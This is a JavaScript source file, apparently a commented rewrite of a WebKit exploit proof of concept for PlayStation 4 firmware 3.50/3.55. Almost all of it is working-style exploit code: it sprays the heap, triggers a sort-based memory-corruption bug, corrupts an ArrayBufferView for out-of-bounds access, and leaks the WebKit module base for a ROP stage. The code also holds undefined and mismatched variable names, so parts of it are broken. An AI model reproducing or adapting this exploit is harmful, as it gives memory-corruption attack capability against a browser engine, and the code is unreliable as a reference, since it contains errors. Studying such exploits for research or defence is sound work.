/*
	This code is based off of Fire30's 3.55 Exploit POC. I have rewritten it so it's a bit cleaner and such. Support for 3.50 has also been added thanks to Maxton!

	I did this mostly for personal learning, so I'm gonna do some comments in the code of how the exploit works to help others as well as myself. If I have stated
	anything that may be incorrect, don't hesitate to let me know so I can fix it!
*/

// These variables are used for making the buffer point to ArrayBufferView (get more info @ irc)
var arrayBufferViewStartOffset;
var arrayBufferViewOffsetOne;
var arrayBufferViewOffsetTwo;
var arrayBufferViewIndex;
var arrayBufferAddress;

// Necessary buffers for exploiting the sort bug
var sortBugHeart;
var sortBugFiller;

// Used to store the object size for arrays used in sort bug
var heartObjectSize;

// Holds length for the heart of the exploit as well as the filler
var maxLenHeart;
var maxLenFiller;

// Holds arrays such as the ArrayBufferView at index 1
var arraysBuffer;
var stackBuffer; // ask about this one, used to be cbuf
var u32Buffer; // Pretty sure this is used for finding the next ArrayBufferView for executing ROP in
var u32Ptr; // Pointer to the u32array we create

// Holds the pointer to the virtual address table as well as the libSceWebKit2.sprx module base
var webKitBaseAddress;
var vtablePtr;

// Used for spraying the heap
var spray;

// Also used for exploit entry
var o = {};

maxLenHeart = 0x3000;
maxLenFiller = 0x800;

// Used for wrapping (or unwrapping) values to/from double precision
_dview = null;

function u2d(low,hi) {
    if (!_dview)
      _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0,hi);
    _dview.setUint32(4,low);
    return _dview.getFloat64(0);
  }

  function d2u(d) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
      _dview.setFloat64(0,d);
    return {
      low: _dview.getUint32(4),
      hi:  _dview.getUint32(0)
    };
  }

function exploitEntryPoint(runRopBool)
{
	// Perform a heap spray 
	spray = new Array(0x1000);

	for(var i = 0; i < spray.length; i++)
		spray[i] = new Uint32Array(0x1A7);

	heart 	= Array.prototype.constructor.apply(null, new Array(maxLenHeart));
	filler 	= new Array(maxLenFiller);
	arrays 	= new Array(4); // Only need to store 4 arrays

	// Setup the exploit

	o.toString = function()
	{
		heart.push(0x3039);

		for(var i = 0; i < arrays.length; ++i)
		{
			var array = Array.prototype.constructor.apply(null, filler);

			array[0] = 0;
			array[1] = 1;
			array[2] = 2;

			arrays[i] = array;
		}
	}

	// Execute exploit

	heart[0] = o;

	heartObjectSize = u2d(0x80000000, 0x80000000);

	for(var i = 1; i < heart.length; ++i)
		heart[i] = heartObjectSize;

	heart.sort(); // We have our entry point

	o.toString = function() {}; // Don't need this function anymore

	// Set up the buffer with NOP Sled for overflow

	u32Buffer = new Array(0x100);

	for(var i = 0; i < 0x100; i++)
	{
		var newBuff = new Uint32Array(0x13AC);

		for(var j = 0; j < v.length; j++)
		{
			// Change all odd sections to 0x90909090 (NOP Sled, if we hit one of these, we're good)
			if(j % 2 == 1)
				v[j] = 0x90909090;
			else
				v[j] = j;
		}

		u32Buffer[i] = newBuff;
	}

	// Modify ArrayBufferView size and point to the next ArrayBufferView for ROP

	arrayBufferView = arrays[1];

	arrayBufferViewStartOffset = 0x2F000;

	arrayBufferViewOffsetOne = d2u(arrayBufferView[(arrayBufferViewStartOffset) + 0x600 + (0xA00 * -40)]).low;
	arrayBufferViewOffsetTwo = d2u(arrayBufferView[(arrayBufferViewStartOffset) + 0x600 + (0xA00 * 30)]).low;

	index = 0;

	// Afterwards we will print out indexes so we can make this more efficient, narrow down the entropy
	for(var i = 4; i < 100; i++)
	{
		var val = d2u(arrayBufferView[(arrayBufferViewStartOffset) + (0x3000 / 8) + ((0x5000 / 8) * i) - (arrayBufferViewOffsetOne / 2) - 1]).hi;

		if(val == 0xbadaeef7)
		{
			// Found the ArrayBufferView
			index = i;
			break;
		}
	}

	// Find an ArrayBufferView and modify it's size, also make it point to ArrayBuffer field

	arrayBufferView[(arrayBufferViewStartOffset) + (0x3000 / 8) + ((0x5000 / 8) * index) - (arrayBufferViewOffsetTwo / 2) + 7] = u2d(0x80000000, 0xbadbeef7);
	arrayBufferView[(arrayBufferViewStartOffset) + (0x3000 / 8) + ((0x5000 / 8) * index) - (arrayBufferViewOffsetTwo / 2) + 2] = arrayBufferView[(arrayBufferViewStartOffset) + (0x3000 / 8) + ((0x5000 / 8) * index) - (arrayBufferViewOffsetTwo / 2) + 4];

	for(var i = 0; i < u32Buffer.length; i++)
	{
		// We've found an ArrayBufferView, modify it so it's larger (0x60000 * 4) and so it points to ArrayBufferViews
		if(u32Buffer[i].length != 0x13AC)
		{
			arrayBufferAddress 	= new dcodeIO.Long(u32Buffer[i][2], u32Buffer[i][3], true);
			u32Ptr 				= new dcodeIO.Long(u32Buffer[i][6], u32Buffer[i][7], true);
			u32Buffer[i][2] = u32Ptr.getLowBitsUnsigned();
			u32Buffer[i][3] = u32Ptr.getHighBitsUnsigned();
			u32Buffer[i][4] = (0x60000 * 4);
			break;
		}
	}

	// Find the modified ArrayBuffer and create our buffer to use from it
	for(var i = 0; i < u32Buffer[i].length; i++)
	{
		if(u32Buffer[i].buffer.byteLength != 0x4eb0)
		{
			stackBuffer = new Uint32Array(u32Buffer[i].buffer);
			break;
		}
	}

	vtablePtr = new dcodeIO.Long(stackBuffer[0], stackBuffer[1], true);
	webKitBaseAddress = vtableptr.sub(0x2600d80); // Offset from the virtual table

	// Unless we're planning on doing ROP, we can stop here safetly.
	if(!runRopBool)
		return;

	// Change size of next ArrayBufferView in memory for ROP

}